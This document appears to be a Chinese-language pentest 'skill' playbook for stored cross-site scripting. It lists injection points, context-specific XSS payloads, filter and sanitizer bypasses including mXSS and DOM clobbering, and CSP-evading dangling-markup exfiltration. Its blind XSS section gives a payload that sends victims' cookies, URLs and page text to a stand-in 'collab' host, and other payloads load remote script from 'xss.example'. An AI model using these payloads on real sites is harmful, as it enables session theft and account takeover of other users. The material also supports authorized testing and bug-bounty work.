# Stored XSS — Skill

## 注入点枚举（优先挑会进别人视图的字段）
- 评论、用户名 / display name、bio、头像 URL、私信、订单备注、gift message、收货地址、工单内容、举报理由、聊天/WebSocket 消息、分享页标题、邀请函
- Headers 进后台日志或工单：User-Agent、Referer、X-Forwarded-For、Origin、Accept-Language、自定义 header、Cookie 名/值
- 文件元数据：文件名、EXIF（ImageDescription/Artist/XPComment/XPKeywords）、ID3、SVG、Office 文档属性、附件名
- 二次落点（最容易漏）：邮件模板、PDF 导出、CSV/Excel 导出、通知中心、审计日志、SIEM/管理面板、错误页、Webhook 回显、审核队列、修订历史/草稿箱、回收站
- API 侧：JSON 字段、GraphQL 变量/mutation 返回、批量导入 CSV 表头、OAuth state/redirect_uri、SSO SAML NameID（存进 session 后回显）

## Canary 与落点定位
- 每字段唯一 token：`bio-a1b2c3`，记录提交账号 / 时间 / 预期渲染点
- token 夹字符一次暴露编码行为：`bio-a1"b2'c3<d4>e5`
- 低权限账号注入，高权限账号（admin / 客服 / 审核）浏览所有相关页面
- 拿到落点后看 canary 前后 30 字符判断上下文：HTML body / 引号内属性 / 无引号属性 / 事件处理器 / `<script>` 内字符串 / 模板字面量 / 注释 / `<textarea>`/`<title>` / CSS / JSON 内嵌 / URL
- 同时抓 API 原始响应（network 面板）与渲染后 DOM：一致 = 服务端渲染；API 是原文但 DOM 变了 = 前端 sanitizer/sink，去前端代码找 `innerHTML`/`dangerouslySetInnerHTML`/`v-html`/`document.write`

## Payload 模板（按上下文）
- HTML body：`<img src=x onerror=alert(document.domain)>`、`<svg onload=alert(1)>`、`<details open ontoggle=alert(1)>`、`<video><source onerror=alert(1)>`
- 双引号属性：`"><img src=x onerror=alert(1)>`、`" autofocus onfocus=alert(1) x="`
- 单引号属性：`'><img src=x onerror=alert(1)>`、`' onmouseover=alert(1) x='`
- 无引号属性：`x onmouseover=alert(1) `（前导空格断开属性）
- HTML 注释内：`--><img src=x onerror=alert(1)>`、`<!--><img src=x onerror=alert(1)>-->`
- `<textarea>`/`<title>`/`<noscript>` 内：`</textarea><img src=x onerror=alert(1)>`、`</title><img src=x onerror=alert(1)>`、`</noscript><img src=x onerror=alert(1)>`
- CSS 内：`</style><img src=x onerror=alert(1)>`、`x;background:url(//collab/1)`
- href/src：`javascript:alert(1)`、`java\tscript:alert(1)`、`jav&#x09;ascript:alert(1)`、`jav&#x0A;ascript:alert(1)`；img src 用 `data:image/svg+xml,<svg onload=alert(1)>`
- `<script>` 内字符串：`';alert(1)//`、`\';alert(1)//`、`</script><script>alert(1)</script>`、`<!--<script>alert(1)</script>-->`
- `<script>` 内数字/JSON：`1;alert(1)`、`1,alert(1)`、`{"a":"</script><svg onload=alert(1)>"}`
- JS 模板字面量：`${alert(1)}`、`` `+alert(1)+` ``
- Markdown：`[x](javascript:alert(1))`、`![x](x"onerror="alert(1))`、`<img src=x onerror=alert(1)>`
- Angular/Vue 模板：`{{constructor.constructor('alert(1)')()}}`、`{{$eval.constructor('alert(1)')()}}`（有 `ng-app` 时）

## 绕过
- 标签/属性黑名单：`<ScRiPt>`、`<scr<script>ipt>`、`<script/x>`、`<img/src=x/onerror=alert(1)>`、`<svg/onload=alert(1)>`、`<scr\x00ipt>`、`<img/src=x/onerror=alert(1)>`
- 事件别名：`onpointerover`、`onanimationstart`、`ontoggle`（配 `<details open>`）、`onfocus`+`autofocus`、`onbegin`/`onend`（SVG）、`onstart`（marquee）
- 关键字过滤：`\u0061lert(1)`、`window['al'+'ert'](1)`、`top['al'+'ert'](1)`、`[].constructor.constructor('alert(1)')()`
- 括号/引号被清：`<img src=x onerror=eval(name)>` 配 `window.name` 或 `<iframe name=alert(1)>`，用 `top[name](1)`
- 空格被过滤：`/**/`、`%09`、`%0a`、`<img/src=x/onerror=...>`
- `javascript:` 被过滤：`java\tscript:`、`jav&#x09;ascript:`、`data:text/html,<script>alert(1)</script>`、`&#106;avascript:`、`javascript&#58;alert(1)`
- 长度受限：`<script src=//xss.example/1.js>`；`<img src=x onerror=s=document.createElement('script');s.src='//x/1.js';document.body.append(s)>`
- DOM clobbering（sink 用 `document.x.src`/`getElementById`）：`<form id=x><input name=src value=//collab/1>`、`<a id=x><a id=x name=y href=//collab/1>`
- sanitizer mXSS（解析差异 / namespace 重排）：
  - `<svg></p><style><img src=x onerror=alert(1)>`
  - `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`
  - `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`
  - `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
  - `<math><mtext><style><!--</style><img src onerror=alert(1)>`
- 允许部分标签时：`<a href="javascript:...">`、`<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`、`<math><a xlink:href="javascript:alert(1)">`、`<use href="data:image/svg+xml,<svg onload=alert(1)>">`
- 双重解码：提交 `&amp;lt;script&amp;gt;` 或 `%253Cscript%253E`，后端 unescape 一次再渲染即触发
- 富文本编辑器的「源码模式 / paste / 拖拽 / API 直传」走不同校验路径，逐一试
- 提交后再进编辑页保存一次，sanitizer 二次解析可能产出新结构

## 无脚本执行时（CSP / sanitizer 下外带数据）
- Dangling markup：`<img src='//collab/?a=` 让后续 HTML（含 CSRF token / 表单值）落到请求 URL；变体 `<a href='//collab/?a=`、`<form action='//collab/'>`、
- `<style>@import '//collab/x?`、`<base href=//collab/>`（劫持后续相对路径资源）
- `<meta http-equiv=refresh content="0;url=//collab/">`
- 外链资源被打死时，退回 `<img src=//collab/1>`、`<link rel=stylesheet href=//collab/1>` 只做触发探测
- CSP 绕过：找 JSONP 端点 / 老库 script gadget 挂到白名单域；`base-uri` 未限制时用 `<base>` 改脚本相对路径

## 文件类
- SVG：`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`，需同源直访 URL（内联或顶层导航才执行）
- 文件名：`"><img src=x onerror=alert(1)>.png`，观察列表页 / 下载页 / 邮件通知
- EXIF ImageDescription/Artist/XPComment 写入 payload，观察后台图片分析/审核页
- Office/PDF 元数据（title/author/keywords）进后台预览器
- Polyglot：GIF/JPEG 头 + `<!--` + HTML；`.svgz`、`.mhtml`、`.xhtml`、`.xsl`（XSLT `document()` 可外带）；PDF 内嵌 JS
- 上传后的「预览 / 解压 / 转码 / 转 PDF」功能是高频 sink

## Blind XSS
- 主投：User-Agent、Referer、姓名、地址、工单正文、订单备注、举报理由、报表导出文件名
- 通用：`"';</script><script src=//collab/b.js></script>`
- 回传上下文与 Cookie：
  `<script>new Image().src='//collab/?c='+document.cookie+'&u='+encodeURIComponent(location.href)+'&h='+encodeURIComponent(document.body.innerText.slice(0,300))</script>`
- 外链被拦时退回 `<img src=//collab/p1>` 只标记命中；再逐步换 `<script>` 测哪层过滤
- UA 命中登录日志 / 错误上报 / 风控后台，触发最快
- 每条 payload 带唯一路径 `/collab/p1`~`/collab/pn`，从 callback 反推字段

## 验证（排除误报）
- 换账号 + 无痕浏览器访问同一 URL 仍执行 = 真 stored
- 只在提交者自己页面执行 = self-XSS，弃
- canary 出现但被实体编码（`&lt;`）= 不执行，别写报告；除非确认下游再解码一层
- 用 `alert(document.domain)` 证明同源，不用 `alert(1)`
- 事件型 payload 需交互（mouseover/click），报告里标注触发条件；优先换成无交互的 `onerror`/`ontoggle`/`autofocus onfocus`
- 保存的 PoC：完整请求（method、URL、body）+ 触发者访问的 URL + 账号角色

## 坑
- 渲染有延迟或走队列：注入后等 1–5 分钟，多页面刷新
- DB 字段长度 / maxlength 截断 payload 中间，把 payload 放到最前
- 存时转义一次、取时再转义：看起来失败实为双层编码，构造嵌套实体
- 编辑页 / preview 页 / 详情页 / 列表页渲染策略不同，逐个试
- SPA 落点是前端 sink（`dangerouslySetInnerHTML` / `v-html` / `innerHTML`），从前端代码定位
- 只在邮件客户端、PDF 导出、移动端、后台审核页渲染的字段最易被忽略
- 单行/多行输入框换行处理不同，多行框用注释断行：`<img src=x/**/onerror=alert(1)>`
- 同一字段列表页截断、详情页完整，两边都要看
- 用户输入经富文本 → 后端渲染 Markdown → 前端再渲染，链路上每层解码行为不同，逐层试
- 中文/emoji 字段可能走不同字符串处理分支（`String.prototype.length` 截断切断 payload），把 payload 放最前